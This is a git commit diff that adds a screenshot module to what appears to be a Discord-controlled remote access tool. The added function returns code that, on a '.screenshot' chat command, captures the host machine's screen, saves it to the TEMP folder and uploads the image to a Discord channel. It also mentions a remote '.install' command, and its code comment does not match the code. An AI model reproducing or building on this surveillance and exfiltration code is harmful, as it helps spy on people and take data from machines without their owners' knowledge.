91e50df8e0000881cc6758c7f310880182027c14
Isaac Lins <contact@isaaclins.com>
2024-12-18 17:52:23 +0100

    completed screenshot modulle!

--- python/components/TODO/Screenshot.py
+++ python/components/TODO/Screenshot.py
@@ -3,3 +3,21 @@
 # ----------------------
 # TODO:
 # -screenshot
+
+def get_code():
+    return """
+    # ADDED AUDIO MANIPULATION MODULE
+        elif message.content.lower().startswith(".screenshot"):
+            try:
+                import pyautogui
+                screenshot = pyautogui.screenshot()
+                path = os.path.join(os.getenv("TEMP"), "screenshot.png")
+                screenshot.save(path)
+                file = discord.File(path)
+                embed = discord.Embed(title="Screenshot", color=0xfafafa)
+                embed.set_image(url="attachment://screenshot.png")
+                await message.channel.send(embed=embed, file=file) 
+            except ImportError:
+                await message.channel.send("pyautogui is not installed. Please install it using `.install pyautogui`.")
+                return
+              """
